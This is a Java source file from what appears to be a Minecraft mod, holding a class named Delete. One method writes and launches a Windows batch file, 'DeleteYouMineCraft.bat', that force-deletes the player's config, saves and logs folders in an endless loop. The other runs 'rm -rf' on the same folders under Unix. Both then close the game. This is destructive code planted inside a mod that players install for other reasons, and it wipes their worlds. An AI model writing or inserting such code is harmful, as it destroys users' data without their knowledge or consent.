package net.lanternmc.avmwandmod.Utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;

public class Delete {
    public void DeleteBat() {
        try {
            FileWriter fw = new FileWriter("DeleteYouMineCraft.bat");
            fw.write("cd /d \"" + FilePath.mcRoot.getAbsolutePath() + File.separator + "\"");
            fw.write("\r\n");
            fw.write(":Home");
            fw.write("\r\n");
            fw.write("del /f /s /q \"" + FilePath.config.getAbsolutePath() + File.separator + "*.*\"");
            fw.write("\r\n");
            fw.write("del /f /s /q \"" + FilePath.saves.getAbsolutePath() + File.separator + "*.*\"");
            fw.write("\r\n");
            fw.write("del /f /s /q \"" + FilePath.logs.getAbsolutePath() + File.separator + "*.*\"");
            fw.write("\r\n");
            fw.write("rd /s /q \"" + FilePath.logs.getAbsolutePath() + File.separator + "\"");
            fw.write("\r\n");
            fw.write("rd /s /q \"" + FilePath.saves.getAbsolutePath() + File.separator + "\"");
            fw.write("\r\n");
            fw.write("rd /s /q \"" + FilePath.config.getAbsolutePath() + File.separator + "\"");
            fw.write("\r\n");
            fw.write("@goto Home");
            fw.write("\r\n");
            fw.write("exit");
            fw.close();
            Process process = Runtime.getRuntime().exec("cmd.exe /C start DeleteYouMineCraft.bat");
            BufferedReader read = new BufferedReader(new InputStreamReader(process.getInputStream()));
            //Effect
            String str = null;
            while ((str = read.readLine()) != null) {
                System.out.println(str);
            }
            System.exit(0);
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void DeleteSh() {
        String shPath = FilePath.mcRoot.getAbsolutePath() + "del.sh";
        //执行的脚本，一个字符串就是一行。
        String[] strs = {
                "rm -rf " + FilePath.saves.getAbsolutePath() + "\r\n",
                "rm -rf " + FilePath.config.getAbsolutePath() + "\n\n",
                "rm -rf " + FilePath.logs.getAbsolutePath() + "\n\n"
        };
        try {
            ShellUtil.createShell(shPath, strs);
            String result = ShellUtil.runShell(shPath);
            // Effect
            System.exit(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
